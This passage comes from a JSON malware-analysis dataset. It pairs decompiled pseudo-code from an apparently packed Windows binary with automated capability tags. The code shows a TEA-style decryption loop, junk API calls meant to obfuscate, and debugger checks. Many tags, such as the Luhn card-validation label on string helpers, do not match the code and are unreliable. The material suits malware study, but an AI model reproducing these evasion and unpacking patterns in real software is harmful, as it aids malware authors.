+ 2) = SUB3216(auVar2 >> 0x40, 0);\n                    *(param_1 + 4) = SUB3216(auVar3 >> 0x40, 0);\n                    param_1 = param_1 + 6;\n                    puVar17 = puVar21 + 6;\n                    uVar24 = uVar26;\n                    uVar25 = uVar4;\n                } while (0x2f < param_3);\n                puVar21 = puVar21 + 7;\n            }\n            else if ((param_2 >> 3 & 1) == 0) {\n                iVar16 = param_2 + -4;\n                uVar24 = *param_2;\n                uVar25 = *(param_2 + 4);\n                uVar26 = *(param_2 + 1);\n                do {\n                    iVar20 = iVar16;\n                    uVar7 = *(iVar20 + 0x20);\n                    param_3 = param_3 - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar4 = *(iVar20 + 0x34);\n                    uVar5 = *(iVar20 + 0x38);\n                    uVar6 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(param_1 + 4) = uVar24;\n                    *(param_1 + 1) = uVar25;\n                    *(param_1 + 0xc) = uVar26;\n                    *(param_1 + 2) = uVar7;\n                    *(param_1 + 2) = SUB3216(auVar2 >> 0x20, 0);\n                    *(param_1 + 4) = SUB3216(auVar3 >> 0x20, 0);\n                    param_1 = param_1 + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar4;\n                    uVar25 = uVar5;\n                    uVar26 = uVar6;\n                } while (0x2f < param_3);\n                puVar21 = iVar20 + 0x34;\n            }\n            else {\n                iVar16 = param_2 + -0xc;\n                uVar24 = *param_2;\n                do {\n                    iVar20 = iVar16;\n                    uVar26 = *(iVar20 + 0x20);\n                    uVar4 = *(iVar20 + 0x24);\n                    uVar5 = *(iVar20 + 0x28);\n                    param_3 = param_3 - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar25 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(param_1 + 0xc) = uVar24;\n                    *(param_1 + 2) = uVar26;\n                    *(param_1 + 0x14) = uVar4;\n                    *(param_1 + 3) = uVar5;\n                    *(param_1 + 2) = SUB3216(auVar2 >> 0x60, 0);\n                    *(param_1 + 4) = SUB3216(auVar3 >> 0x60, 0);\n                    param_1 = param_1 + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar25;\n                } while (0x2f < param_3);\n                puVar21 = iVar20 + 0x3c;\n            }\n            for (; 0xf < param_3; param_3 = param_3 - 0x10) {\n                uVar24 = *puVar21;\n                uVar25 = *(puVar21 + 4);\n                uVar26 = *(puVar21 + 1);\n                uVar4 = *(puVar21 + 0xc);\n                puVar21 = puVar21 + 2;\n                *param_1 = uVar24;\n                *(param_1 + 4) = uVar25;\n                *(param_1 + 1) = uVar26;\n                *(param_1 + 0xc) = uVar4;\n                param_1 = param_1 + 2;\n            }\n            if ((param_3 >> 2 & 1) != 0) {\n                uVar24 = *puVar21;\n                param_3 = param_3 - 4;\n                puVar21 = puVar21 + 4;\n                *param_1 = uVar24;\n                param_1 = param_1 + 4;\n            }\n            if ((param_3 >> 3 & 1) != 0) {\n                param_3 = param_3 - 8;\n                *param_1 = *puVar21;\n            }\n    // WARNING: Could not recover jumptable at 0x00405cf9. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (4 cases) at 0x405e28\n            puVar17 = (**(param_3 * 4 + 0x405e28))();\n            return puVar17;\n        }\n    }\n    uVar18 = param_3 >> 2;\n    if (uVar18 < 8) {\ncode_r0x00405d38:\n    // WARNING: Could not recover jumptable at 0x00405d38. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x405dbc\n        puVar17 = (**(uVar18 * 4 + 0x405dbc))();\n        return puVar17;\n    }\n    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n        *puVar17 = *param_2;\n        param_2 = param_2 + 4;\n        puVar17 = puVar17 + 4;\n    }\n    // switch table (4 cases) at 0x405e28\n    switch(param_3 & 3) {\n    case 0:\n        return param_1;\n    case 2:\ncode_r0x00405e4c:\n        *puVar17 = *param_2;\n        *(puVar17 + 1) = *(param_2 + 1);\n        return param_1;\n    case 3:\ncode_r0x00405e60:\n        *puVar17 = *param_2;\n        *(puVar17 + 1) = *(param_2 + 1);\n        *(puVar17 + 2) = *(param_2 + 2);\n        return param_1;\n    }\ncode_r0x00405e40:\n    *puVar17 = *param_2;\n    return param_1;\n}\n",
        "token_count": 5824
    },
    "004012b0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid fcn.004012b0(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uStack00000012;\n    uint8_t uStack00000013;\n    int32_t iStack00000018;\n    uint8_t uStack00000022;\n    uint8_t uStack00000023;\n    int32_t in_stack_00000024;\n    \n    fcn.0041b7a0();\n    iVar2 = 0;\n    do {\n        if (iVar2 == 0x86c4dc) {\n            in_stack_00000024 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x8b2013);\n    iStack00000018 = 0;\n    iVar2 = 4;\n    uVar3 = 0;\n    if (*0x451ffc != 0) {\n        do {\n            uStack00000023 = *(*0x44dc74 + 3 + uVar3);\n            uStack00000022 = *(*0x44dc74 + 2 + uVar3);\n            uStack00000013 = *(*0x44dc74 + uVar3) | (uStack00000023 & 0x30) << 2;\n            uStack00000012 = *(*0x44dc74 + 1 + uVar3) | (uStack00000023 & 0xc) << 4;\n            if (*0x451ffc == 0x26a) {\n                (*_sym.imp.KERNEL32.dll_WritePrivateProfileStructW)();\n            }\n            uVar1 = uStack00000022 | uStack00000023 << 6;\n            if (*0x451ffc == 0x869) {\n                (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n                (*_sym.imp.KERNEL32.dll_GetLongPathNameW)();\n            }\n            *(iStack00000018 + in_stack_00000024) = uStack00000013;\n            *(iStack00000018 + 1 + in_stack_00000024) = uStack00000012;\n            *(iStack00000018 + 2 + in_stack_00000024) = uVar1;\n            iStack00000018 = iStack00000018 + 3;\n            uVar3 = uVar3 + iVar2;\n        } while (uVar3 < *0x451ffc);\n    }\n    *0x44dc74 = in_stack_00000024;\n    *0x451ffc = iStack00000018;\n    return;\n}\n",
        "token_count": 577
    },
    "00413535": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00413535(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 91
    },
    "0040164f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040164f(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iStack32;\n    uint32_t uStack28;\n    \n    iVar4 = *0x444204;\n    iVar3 = *0x444200;\n    iVar2 = *0x4441fc;\n    iVar1 = *0x4441f8;\n    uStack28 = param_1[1];\n    uVar7 = *param_1;\n    iStack32 = -0x3910c8e0;\n    uVar6 = 0;\n    do {\n        uStack28 = uStack28 - ((uVar7 >> 5) + iVar4 ^ iStack32 + uVar7 ^ uVar7 * 0x10 + iVar3);\n        uVar5 = uStack28 + iStack32;\n        uVar7 = uVar7 - ((uStack28 >> 5) + iVar2 ^ uVar5 ^ uStack28 * 0x10 + iVar1);\n        if (*0x451ffc == 0x13fd) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_MoveFileA)(0x430648, \"mexekulinevituwazija xuvureliwarakacucupufi\");\n        }\n        iStack32 = iStack32 + 0x61c88647;\n        uVar6 = uVar6 + 1;\n    } while (uVar6 < 0x20);\n    *param_1 = uVar7;\n    param_1[1] = uStack28;\n    return uVar5;\n}\n",
        "token_count": 405
    },
    "00404b0d": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00404b0d(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *extraout_ECX;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t unaff_EBP;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00428d18();\n    *(unaff_EBP + -0x10) = &var_18h;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    uVar6 = *(unaff_EBP + 8) | 0xf;\n    if (uVar6 == 0xffffffff) {\n        uVar6 = *(unaff_EBP + 8);\n    }\n    else {\n        uVar1 = extraout_ECX[5];\n        uVar4 = uVar1 >> 1;\n        *(unaff_EBP + -0x14) = 3;\n        if (uVar6 / *(unaff_EBP + -0x14) < uVar4) {\n            if (-uVar4 - 2 < uVar1) {\n                uVar6 = 0xfffffffe;\n            }\n            else {\n                uVar6 = uVar4 + uVar1;\n            }\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    if (uVar6 == 0xffffffff) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = fcn.00404c5a();\n    }\n    *(unaff_EBP + -0x14) = uVar3;\n    *(unaff_EBP + -0x18) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    iVar2 = *(unaff_EBP + 0xc);\n    if (iVar2 != 0) {\n        puVar5 = extraout_ECX;\n        if (0xf < extraout_ECX[5]) {\n            puVar5 = *extraout_ECX;\n        }\n        if (iVar2 != 0) {\n            fcn.004052e0(uVar3, puVar5, iVar2);\n        }\n    }\n    fcn.004048a4(1, 0);\n    if (extraout_ECX != NULL) {\n        *extraout_ECX = *(unaff_EBP + -0x14);\n    }\n    extraout_ECX[5] = uVar6;\n    extraout_ECX[4] = iVar2;\n    puVar5 = extraout_ECX;\n    if (0xf < uVar6) {\n        puVar5 = *extraout_ECX;\n    }\n    *(puVar5 + iVar2) = 0;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 722
    },
    "00404c5a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404c5a(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *arg_8h;\n    uint uVar4;\n    code *var_10h;\n    char *var_4h;\n    \n    var_4h = 0x404c65;\n    iVar2 = fcn.00406c99(param_1);\n    if (iVar2 == 0) {\n        uVar4 = 1;\n        arg_8h = &fcn.00404c5a::var_4h;\n        var_4h = \"bad allocation\";\n        fcn.00407589(arg_8h);\n        uVar3 = 0x4415cc;\n        var_10h = vtable.std::bad_alloc.0;\n        fcn.00406ec0(&fcn.00404c5a::var_10h, 0x4415cc);\n        pcVar1 = swi(3);\n        (*pcVar1)(uVar3, arg_8h, uVar4);\n        return;\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "0040c6c7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c6c7(int32_t arg_8h)\n\n{\n    if (*0x443950 != -1) {\n        if (arg_8h == 0) {\n            arg_8h = fcn.0040ab00(*0x443950);\n        }\n        fcn.0040ab1f(*0x443950, 0);\n        fcn.0040c592(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0040f7ee": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040f7ee(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t arg_8h_00;\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00409270(0x441ba8, 0x10);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar1 = fcn.00408fd0();\n        *puVar1 = 0;\n        puVar1 = fcn.00409004();\n        *puVar1 = 9;\n    }\n    else {\n        if ((arg_8h_00 < 0) || (*0x456bec <= arg_8h_00)) {\n            puVar1 = fcn.00408fd0();\n            *puVar1 = 0;\n        }\n        else {\n            iVar3 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*((arg_8h_00 >> 5) * 4 + 0x4457f0) + 4 + iVar3) & 1) != 0) {\n                fcn.0041b119(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((arg_8h_00 >> 5) * 4 + 0x4457f0) + 4 + iVar3) & 1) == 0) {\n                    puVar1 = fcn.00409004();\n                    *puVar1 = 9;\n                    puVar1 = fcn.00408fd0();\n                    *puVar1 = 0;\n                    uVar2 = 0xffffffff;\n                }\n                else {\n                    uVar2 = fcn.0040f8dd(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                }\n                *(unaff_EBP + -0x1c) = uVar2;\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040f8b5();\n                goto code_r0x0040f8d7;\n            }\n            puVar1 = fcn.00408fd0();\n            *puVar1 = 0;\n        }\n        puVar1 = fcn.00409004();\n        *puVar1 = 9;\n        fcn.00407cd0();\n    }\ncode_r0x0040f8d7:\n    fcn.004092b5();\n    return;\n}\n",
        "token_count": 651
    },
    "004194d2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004194d2(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint arg_8h_00;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    code *var_18h;\n    code *var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_EncodePointer;\n    var_4h = *0x443998 ^ &stack0xfffffffc;\n    var_1ch = arg_8h;\n    iVar7 = 0;\n    arg_8h_00 = 0;\n    var_20h = arg_ch;\n    pcVar1 = (*_sym.imp.KERNEL32.dll_EncodePointer)();\n    var_18h = pcVar1;\n    var_14h = fcn.0040ac38();\n    if (*0x445da0 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(L\"USER32.DLL\", 0, 0x800);\n        if (((iVar2 == 0) &&\n            ((iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar2 != 0x57 ||\n             (iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(L\"USER32.DLL\", 0, 0),  iVar2 == 0)))) ||\n           (iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxW\"),  iVar3 == 0)) goto code_r0x004196a7;\n        *0x445da0 = (*pcVar6)(iVar3);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetActiveWindow\");\n        *0x445da4 = (*pcVar6)(uVar4);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetLastActivePopup\");\n        *0x445da8 = (*pcVar6)(uVar4);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetUserObjectInformationW\");\n        *0x445db0 = (*pcVar6)(uVar4);\n        pcVar1 = var_18h;\n        if (*0x445db0 != NULL) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetProcessWindowStation\");\n            *0x445dac = (*pcVar6)(uVar4);\n            pcVar1 = var_18h;\n        }\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    if (iVar2 == 0) {\n        if (var_14h != NULL) {\n            (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x445da0);\n            goto code_r0x004196a7;\n        }\n    }\n    else {\n        if (var_1ch != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(var_1ch);\n        }\n        if (var_14h != NULL) goto code_r0x004196a7;\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x445dac == pcVar1) || (*0x445db0 == pcVar1)) {\ncode_r0x0041965d:\n        if ((((*0x445da4 != pcVar1) && (pcVar5 = (*pcVar6)(*0x445da4),  pcVar5 != NULL)) &&\n            (iVar7 = (*pcVar5)(),  iVar7 != 0)) &&\n           ((*0x445da8 != pcVar1 && (pcVar1 = (*pcVar6)(*0x445da8),  pcVar1 != NULL)))) {\n            iVar7 = (*pcVar1)(iVar7);\n        }\n    }\n    else {\n        var_14h = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x445dac);\n        var_18h = (*pcVar6)(*0x445db0);\n        if (((var_14h == NULL) || (var_18h == NULL)) ||\n           (((iVar2 = (*var_14h)(),  iVar2 != 0 && (iVar2 = (*var_18h)(iVar2, 1, &var_10h, 0xc, &var_24h),  iVar2 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0041965d;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x445da0);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(iVar7, var_1ch, var_20h, arg_10h);\n    }\ncode_r0x004196a7:\n    fcn.00406eb1(arg_8h_00);\n    return;\n}\n",
        "token_count": 1188
    },
    "0041b52e": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17",
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0041b52e(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if (unaff_EDI == 0) {\n        puVar1 = *((unaff_ESI >> 5) * 4 + 0x4457f0) + 4 + (unaff_ESI & 0x1f) * 0x40;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.0041b5d5(unaff_ESI);\n    return;\n}\n",
        "token_count": 137
    },
    "0041d72e": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10ch\n\nvoid __cdecl fcn.0041d72e(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x443998 ^ &stack0xfffffffc;\n    if (((arg_8h < 6) && (arg_ch != 0)) &&\n       (iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, arg_ch, 0xffffffff, &var_10ch, 0x83),  iVar1 != 0)) {\n        fcn.0041de20(arg_8h, &var_10ch);\n    }\n    fcn.00406eb1(var_10ch);\n    return;\n}\n",
        "token_count": 194
    },
    "00401070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00401070(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    float10 fVar1;\n    uint in_stack_00000010;\n    \n    fVar1 = fcn.00406383(CONCAT44(noname_1, arg_8h), CONCAT44(in_stack_00000010, arg_10h));\n    return fVar1;\n}\n",
        "token_count": 92
    },
    "0040109f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040109f(void)\n\n{\n    ulong in_XMM0_Qa;\n    ulong in_XMM1_Qa;\n    uint var_bp_8h;\n    \n    fcn.00405930(in_XMM0_Qa, in_XMM0_Qa >> 0x20, in_XMM1_Qa, in_XMM1_Qa >> 0x20);\n    return;\n}\n",
        "token_count": 88
    },
    "004018dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get OS version"
        ],
        "decompiled_code": "\nvoid fcn.004018dc(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar auStack160 [160];\n    \n    uVar1 = *0x451ffc / 8;\n    uVar2 = 0;\n    if (uVar1 != 0) {\n        do {\n            if (*0x451ffc == 0x115d) {\n                (*_sym.imp.KERNEL32.dll_VerifyVersionInfoA)(auStack160, 0, 0, 0);\n            }\n            fcn.0040164f();\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < uVar1);\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "004019dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004019dd(void)\n\n{\n    uint var_4h;\n    \n    return *0x44dc74 + 0x4dd;\n}\n",
        "token_count": 37
    },
    "00401a12": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\nvoid fcn.00401a12(void)\n\n{\n    *0x451ffc = *0x444c88 + 0x8f176;\n    return;\n}\n",
        "token_count": 37
    },
    "004047f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004047f1(uint *param_1, uint *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    if (param_2[4] < param_3) {\n        fcn.00405221(\"invalid string position\");\n        pcVar1 = swi(3);\n        puVar3 = (*pcVar1)();\n        return puVar3;\n    }\n    uVar4 = param_2[4] - param_3;\n    if (param_4 < uVar4) {\n        uVar4 = param_4;\n    }\n    if (param_1 == param_2) {\n        fcn.00404980(uVar4 + param_3);\n        fcn.004049ac(0, param_3);\n    }\n    else {\n        cVar2 = fcn.00404a42(uVar4, 0);\n        if (cVar2 != '\\0') {\n            if (0xf < param_2[5]) {\n                param_2 = *param_2;\n            }\n            puVar3 = param_1;\n            if (0xf < param_1[5]) {\n                puVar3 = *param_1;\n            }\n            if (uVar4 != 0) {\n                fcn.004052e0(puVar3, param_2 + param_3, uVar4);\n            }\n            param_1[4] = uVar4;\n            puVar3 = param_1;\n            if (0xf < param_1[5]) {\n                puVar3 = *param_1;\n            }\n            *(puVar3 + uVar4) = 0;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 407
    },
    "00404908": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00404908(uint *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    cVar1 = fcn.00404aa3(param_2);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00404a42(param_2, 0);\n        if (cVar1 != '\\0') {\n            puVar2 = param_1;\n            if (0xf < param_1[5]) {\n                puVar2 = *param_1;\n            }\n            if (param_2 != 0) {\n                fcn.004052e0(puVar2, param_2, param_2);\n            }\n            param_1[4] = param_2;\n            puVar2 = param_1;\n            if (0xf < param_1[5]) {\n                puVar2 = *param_1;\n            }\n            *(puVar2 + param_2) = 0;\n        }\n    }\n    else {\n        puVar2 = param_1;\n        if (0xf < param_1[5]) {\n            puVar2 = *param_1;\n        }\n        param_1 = fcn.004047f1(param_1, param_2 - puVar2, param_2);\n    }\n    return param_1;\n}\n",
        "token_count": 303
    },
    "004049ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004049ac(uint *param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    uVar1 = param_1[4];\n    if (uVar1 < param_2) {\n        fcn.00405221(\"invalid string position\");\n        pcVar2 = swi(3);\n        puVar3 = (*pcVar2)();\n        return puVar3;\n    }\n    if (param_3 < uVar1 - param_2) {\n        if (param_3 != 0) {\n            puVar3 = param_1;\n            if (0xf < param_1[5]) {\n                puVar3 = *param_1;\n            }\n            iVar4 = uVar1 - param_3;\n            if (iVar4 - param_2 != 0) {\n                fcn.00405af0(puVar3 + param_2, puVar3 + param_2 + param_3, iVar4 - param_2);\n            }\n            param_1[4] = iVar4;\n            puVar3 = param_1;\n            if (0xf < param_1[5]) {\n                puVar3 = *param_1;\n            }\n            *(puVar3 + iVar4) = 0;\n        }\n    }\n    else {\n        param_1[4] = param_2;\n        puVar3 = param_1;\n        if (0xf < param_1[5]) {\n            puVar3 = *param_1;\n        }\n        *(puVar3 + param_2) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 385
    },
    "00404aa3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00404aa3(uint *param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    \n    if (param_2 != NULL) {\n        in_EAX = param_1;\n        if (0xf < param_1[5]) {\n            in_EAX = *param_1;\n        }\n        if (in_EAX <= param_2) {\n            puVar1 = param_1;\n            if (0xf < param_1[5]) {\n                puVar1 = *param_1;\n            }\n            in_EAX = param_1[4] + puVar1;\n            if (param_2 < in_EAX) {\n                return CONCAT31(in_EAX >> 8, 1);\n            }\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 192
    },
    "00405930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405930(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_2c8h;\n    \n    fcn.00407b0d(arg_8h, arg_ch);\n    fcn.00407b0d(arg_10h, arg_14h);\n    fcn.0040f2f7();\n    fcn.0040798c();\n    return;\n}\n",
        "token_count": 103
    },
    "00405957": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405957(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00407f10(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "00405981": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405981(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00407f45(arg_8h, arg_ch, &arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "004059f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059f1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0040825a(arg_8h, arg_ch, arg_10h, 0, &arg_14h);\n    return;\n}\n",
        "token_count": 68
    },
    "00405a0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a0d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0040825a(arg_8h, arg_ch, arg_10h, arg_14h, &arg_18h);\n    return;\n}\n",
        "token_count": 77
    },
    "00407ada": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ada(uint arg_8h, uint arg_ch)\n\n{\n    uint var_2c8h;\n    \n    fcn.00407b0d(arg_8h, arg_ch);\n    fcn.0040f290();\n    fcn.0040798c();\n    return;\n}\n",
        "token_count": 70
    },
    "00407e9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407e9a(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00407eb4(fcn.004083a8, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "00407f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
